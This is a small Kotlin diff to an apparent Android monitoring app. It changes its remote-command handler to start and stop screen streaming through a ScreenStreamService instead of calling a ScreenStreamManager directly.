@@ -559,7 +559,7 @@ class SyncRunner(private val context: Context) {
     private suspend fun processScreenStreamCommand(bearer: String, command: RemoteCommand) {
         val action = (command.payload?.get("action") as? String) ?: "start"
         if (action == "stop") {
-            com.spapp.monitoring.screenstream.ScreenStreamManager.stopStreaming()
+            com.spapp.monitoring.screenstream.ScreenStreamService.stop(context)
             try {
                 ApiClient.service.ackCommand(
                     bearer,
@@ -624,7 +624,7 @@ class SyncRunner(private val context: Context) {
             return
         }
 
-        com.spapp.monitoring.screenstream.ScreenStreamManager.startStreaming(context, authToken, deviceId)
+        com.spapp.monitoring.screenstream.ScreenStreamService.start(context)
 
         try {
             ApiClient.service.ackCommand(
